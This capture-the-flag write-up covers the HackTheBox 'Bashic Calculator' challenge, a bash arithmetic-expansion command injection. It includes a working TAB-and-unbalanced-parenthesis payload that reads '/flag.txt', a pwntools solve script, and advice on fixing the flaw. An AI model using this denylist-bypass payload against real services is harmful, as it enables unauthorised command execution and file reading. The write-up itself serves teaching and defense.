---
title: "Bashic Calculator"
date: 2027-05-19 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, command-injection, bash, arithmetic-expansion, denylist-bypass]
description: "An Easy Misc challenge: a 'safe' calculator runs your input through bash arithmetic and strips a character denylist — but its own $(( is the command-substitution primitive, and an unbalanced parenthesis collapses it straight into a shell."
---

## Overview

**Bashic Calculator** is an Easy HackTheBox **Misc** challenge. A TCP service evaluates
your math by literally running `echo $(( <your input> ))` in bash, and tries to stay safe
by stripping a denylist of "dangerous" characters. The catch is that the program's *own*
`$((` is a command-substitution primitive — you don't need to type `$(...)`, you only need
to *reveal* it. This is a textbook [OS command injection](https://cwe.mitre.org/data/definitions/78.html)
through a leaky character denylist.

## The technique

The server (`main.go`) reads a line, strips these characters from it —
space, backtick, `$`, `&`, `|`, `;`, `>` — and then builds:

```go
op := /* user input, denylisted chars removed */
command := "echo $((" + op + "))"
exec.Command("bash", "-c", command).Output()   // output is sent back to you
```

The author's reasoning: "I removed `$` and backtick, so no `$(...)` / `` `...` `` command
substitution is possible." But bash's grammar betrays that assumption:

- `$(( EXPR ))` is **arithmetic expansion**. If you sneak in an **unbalanced closing
  parenthesis**, bash re-parses `$((cmd)...)` as the **command substitution** `$( (cmd) )`,
  where the inner `( ... )` is a subshell. Subshells run commands.
- **TAB (`0x09`) is whitespace to bash but is not on the denylist** (only the space character
  `0x20` is). So a TAB stands in for every space you need.
- **`#` starts a comment** — it swallows the template's leftover `))`.

The subshell's stdout is captured by the substitution and handed to `echo`, which prints it
right back over the socket.

## Solution

The payload is sent as the `Operation:` line (`\t` = a literal TAB character):

```
cat	/flag.txt)	)	#
```

After the server wraps it, bash sees:

```bash
echo $((cat	/flag.txt)	)	#))
   ==  echo $( (cat /flag.txt) )
```

`cat /flag.txt` runs in the subshell and its output is echoed back. Note the **absolute**
path `/flag.txt` — the service's working directory is `/home/ctf`, so a relative
`flag.txt` wouldn't be found, and a space between `cat` and the path would be stripped by
the denylist (use the TAB).

Drive it with a short script:

`solve.py`:

```python
import sys
from pwn import remote

host, port = sys.argv[1], int(sys.argv[2])
io = remote(host, port)
io.recvuntil(b"Operation:")
io.sendline(b"cat\t/flag.txt)\t)\t#")   # TAB-separated, unbalanced ')', '#' comment
print(io.recvall(timeout=5).decode())    # -> HTB{...}
```

```bash
python3 solve.py <host> <port>
# ... HTB{...}
```

The flag prints straight out of the calculator's "result". Flag value redacted.

## Why it worked

A denylist of *characters* can't stop injection when the dangerous primitive — `$((` — is
baked into the program's own command string. Command substitution never had to be typed; it
only had to be uncovered by unbalancing the arithmetic parentheses. The filter also forgot
that TAB is whitespace to bash just like a space, and that `#` begins a comment.

## Fix / defense

- **Never splice user input into `$(( ))` or any shell string.** Parse the arithmetic
  yourself, or hand the expression to `bc`/`awk` as *data* (an argv array, `shell=False`) —
  never as part of a constructed command.
- If you must validate, use an **allowlist** like `^[0-9+\-*/(). \t]+$` rather than
  denylisting characters — and remember the template's own `$((` is a substitution
  primitive, so even a "clean" expression inside `$(())` is unsafe.
- Denylists of `$`/space are insufficient: TAB, `#`, and unbalanced parentheses all slip
  through.
